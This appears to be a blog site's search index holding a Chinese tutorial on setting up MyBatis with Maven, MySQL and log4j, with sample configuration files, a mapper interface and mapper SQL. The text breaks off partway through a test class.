<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Mybatis</title>
    <link href="/2023/02/21/MyBatis/"/>
    <url>/2023/02/21/MyBatis/</url>
    
    <content type="html"><![CDATA[<h2 id="1-MyBatis简介">1. MyBatis简介</h2><h3 id="1-1-历史">1.1 历史</h3><p>原先是Apache的一个开源项目iBatis, 在3.x版本后改名为MyBatis并迁移到了GitHub中</p><h3 id="1-2-特性">1.2 特性</h3><ol><li class="lvl-3">MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架</li><li class="lvl-3">MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集</li><li class="lvl-3">MyBatis可以使用简单的XML或注解用于配置和原始映射，将接口和Java的POJO（Plain Old Java Objects，普通的Java对象）映射成数据库中的记录</li><li class="lvl-3">MyBatis 是一个 半自动的ORM（Object Relation Mapping）框架</li></ol><h3 id="1-3-对比">1.3 对比</h3><ul class="lvl-0"><li class="lvl-2"><p>JDBC</p><ul class="lvl-2"><li class="lvl-5">SQL 夹杂在Java代码中耦合度高，导致硬编码内伤</li><li class="lvl-5">维护不易且实际开发需求中 SQL 有变化，频繁修改的情况多见</li><li class="lvl-5">代码冗长，开发效率低</li></ul></li><li class="lvl-2"><p>Hibernate 和 JPA</p><ul class="lvl-2"><li class="lvl-5">操作简便，开发效率高</li><li class="lvl-5">程序中的长难复杂 SQL 需要绕过框架</li><li class="lvl-6">内部自动生产的 SQL，不容易做特殊优化</li><li class="lvl-5">基于全映射的全自动框架，大量字段的 POJO 进行部分映射时比较困难。</li><li class="lvl-5">反射操作太多，导致数据库性能下降</li></ul></li><li class="lvl-2"><p>MyBatis</p><ul class="lvl-2"><li class="lvl-5">轻量级，性能出色</li><li class="lvl-5">SQL 和 Java 编码分开，功能边界清晰。Java代码专注业务、SQL语句专注数据</li><li class="lvl-5">开发效率稍逊于HIbernate，但是完全能够接受</li></ul></li></ul><h2 id="2-搭建MyBatis">2. 搭建MyBatis</h2><h3 id="2-1-开发环境">2.1 开发环境</h3><blockquote><p>IDE：idea 2019.2<br>构建工具：maven 3.5.4<br>MySQL版本：MySQL 8<br>MyBatis版本：MyBatis 3.5.7</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">MySQL不同版本的注意事项<br>1、驱动类driver-class-name<br>MySQL 5版本使用jdbc5驱动，驱动类使用：com.mysql.jdbc.Driver<br>MySQL 8版本使用jdbc8驱动，驱动类使用：com.mysql.cj.jdbc.Driver<br>2、连接地址url<br>MySQL 5版本的url：<br>jdbc:mysql://localhost:3306/ssm<br>MySQL 8版本的url：<br>jdbc:mysql://localhost:3306/ssm?serverTimezone=UTC<br>否则运行测试用例报告如下错误：<br>java.sql.SQLException: The server time zone value <span class="hljs-string">&#x27;ÖÐ¹ú±ê×¼Ê±¼ä&#x27;</span> is unrecognized or<br>represents more<br></code></pre></td></tr></table></figure><h3 id="2-2-创建maven工程">2.2 创建maven工程</h3><ol><li class="lvl-3"><p>新建一个空项目, 在最下面</p></li><li class="lvl-3"><p>配置maven, 在设置-build-build tools-maven中, 改配置文件更换镜像地址, 本地仓库位置</p></li><li class="lvl-3"><p>设置jdk版本, 1.8对应8版本</p></li><li class="lvl-3"><p>新建模块, 选择maven</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">groupid和artifactId被统称为“坐标”是为了保证项目唯一性而提出的，如果你要把你项目弄到maven本地仓库去，你想要找到你的项目就必须根据这两个<span class="hljs-built_in">id</span>去查找。<br>groupId一般分为多个段，这里我只说两段，第一段为域，第二段为公司名称。域又分为org、com、cn等等许多，其中org为非营利组织，com为商业组织。举个apache公司的tomcat项目例子：这个项目的groupId是org.apache，它的域是org（因为tomcat是非营利项目），公司名称是apache，artifactId是tomcat。<br>比如我创建一个项目，我一般会将groupId设置为cn.snowin，cn表示域为中国，snowin是我个人姓名缩写，artifactId设置为testProj，表示你这个项目的名称是testProj，依照这个设置，你的包结构最好是cn.snowin.testProj打头的，如果有个StudentDao，它的全路径就是cn.snowin.testProj.dao.StudentDao<br></code></pre></td></tr></table></figure><h3 id="2-3-配置maven配置文件">2.3 配置maven配置文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.atguigu.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis_helloworld<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>jar<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- Mybatis核心 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- junit测试 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- MySQL驱动 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- log4j日志 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-4-配置MyBatis">2.4 配置MyBatis</h3><ol><li class="lvl-3"><p>配置mybatis核心配置文件</p></li></ol><blockquote><p>在resources文件新建mybatis-config.xml文件, 配置mybits</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--设置连接数据库的环境--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/ssm?serverTimezone=UTC&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--引入mybatis映射文件--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;mappers/UserMapper.xml&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="2-4-创建mapper接口">2.4 创建mapper接口</h3><blockquote><p>MyBatis中的mapper接口相当于以前的dao。但是区别在于，mapper仅仅是接口，我们不需要提供实现类。 后面会通过mybatis的代理自动生成实例</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.atguigu.mybatis.mapper;<br><br><span class="hljs-keyword">import</span> com.atguigu.mybatis.pojo.User;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserMapper</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">insertUser</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteUser</span><span class="hljs-params">()</span>;<br>    User <span class="hljs-title function_">getUserById</span><span class="hljs-params">()</span>;<br>    List&lt;User&gt; <span class="hljs-title function_">getAllUser</span><span class="hljs-params">()</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-5-创建mybatis影射文件">2.5 创建mybatis影射文件</h3><p>相关概念：ORM（Object Relationship Mapping）对象关系映射。对象：Java的实体类对象关系：关系型数据库映射：二者之间的对应关系</p><table><thead><tr><th>Java概念</th><th>数据库概念</th></tr></thead><tbody><tr><td>类</td><td>表</td></tr><tr><td>属性</td><td>字段/列</td></tr><tr><td>对象</td><td>记录/行</td></tr></tbody></table><blockquote><p>1、映射文件的命名规则：表所对应的实体类的类名+Mapper.xml<br>例如：表t_user，映射的实体类为User，所对应的映射文件为UserMapper.xml<br>因此一个映射文件对应一个实体类，对应一张表的操作<br>MyBatis映射文件用于编写SQL，访问以及操作表中的数据<br>MyBatis映射文件存放的位置是src/main/resources/mappers目录下<br>2、 MyBatis中可以面向接口操作数据，要保证两个一致：<br>a&gt;mapper接口的全类名和映射文件的命名空间（namespace）保持一致<br>b&gt;mapper接口中方法的方法名和映射文件中编写SQL的标签的id属性保持一致</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--namespace与mapper接口一致, 全类名形式--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.atguigu.mybatis.mapper.UserMapper&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--  int insertUser();  --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertUser&quot;</span>&gt;</span><br>        insert into t_user values(null, &#x27;admin&#x27;, &#x27;123456&#x27;,23,&#x27;男&#x27;,&#x27;123@qq.com&#x27;)<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--  int updateUser();--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateUser&quot;</span>&gt;</span><br>        update t_user set username = &#x27;root&#x27;,password=&#x27;123&#x27; where id=3;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--  void deleteUser();--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteUser&quot;</span>&gt;</span><br>        delete from t_user where id = 3;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--  User getUserById();  --&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">        resultType: 设置结果类型, 既查询的数据要转换为的java类型</span><br><span class="hljs-comment">        resultMap: 自定义映射, 处理多对一或一对多的元素关系, 字段数理不匹配时用</span><br><span class="hljs-comment">      --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserById&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.atguigu.mybatis.pojo.User&quot;</span>&gt;</span><br>        select * from t_user where id=2;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--  List&lt;User&gt; getAllUser();  --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getAllUser&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.atguigu.mybatis.pojo.User&quot;</span>&gt;</span><br>        select * from t_user;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-6-通过junit测试功能">2.6 通过junit测试功能</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- maven配置 --&gt;</span><br><span class="hljs-comment">&lt;!-- junit测试 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-7-加入log4j日志功能">2.7 加入log4j日志功能</h3><blockquote><p><strong>日志的级别</strong><br>FATAL(致命)&gt;ERROR(错误)&gt;WARN(警告)&gt;INFO(信息)&gt;DEBUG(调试)<br>从左到右打印的内容越来越详细</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">log4j</span>:configuration <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;log4j.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">log4j:configuration</span> <span class="hljs-attr">xmlns:log4j</span>=<span class="hljs-string">&quot;http://jakarta.apache.org/log4j/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;STDOUT&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.apache.log4j.ConsoleAppender&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Encoding&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">layout</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.apache.log4j.PatternLayout&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ConversionPattern&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;%-5p %d&#123;MM-dd HH:mm:ss,SSS&#125;</span></span><br><span class="hljs-string"><span class="hljs-tag">%m (%F:%L) \n&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">layout</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">logger</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;java.sql&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">level</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;debug&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">logger</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">logger</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;org.apache.ibatis&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">level</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;info&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">logger</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">level</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;debug&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;STDOUT&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">log4j:configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/12889352/1676038827320-72de851c-5cd5-47a8-8d58-299e4f2b9741.png#averageHue=%23f8f7f3&amp;clientId=ud1453d36-f62b-4&amp;from=paste&amp;height=707&amp;id=u91597024&amp;name=image.png&amp;originHeight=884&amp;originWidth=1720&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=834374&amp;status=done&amp;style=none&amp;taskId=u0cb7494a-379a-4044-b9fb-b3b45e8774f&amp;title=&amp;width=1376" alt="image.png"></p><h3 id="2-8-创建测试类">2.8 创建测试类</h3><blockquote><p>SqlSession：代表Java程序和数据库之间的会话。（HttpSession是Java程序和浏览器之间的会话）<br>SqlSessionFactory：是“生产”SqlSession的“工厂”。工厂模式：如果创建某一个对象，使用的过程基本固定，那么我们就可以把创建这个对象的相关代码封装到一个“工厂类”中，以后都使用这个工厂类来“生产”我们需要的对象。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 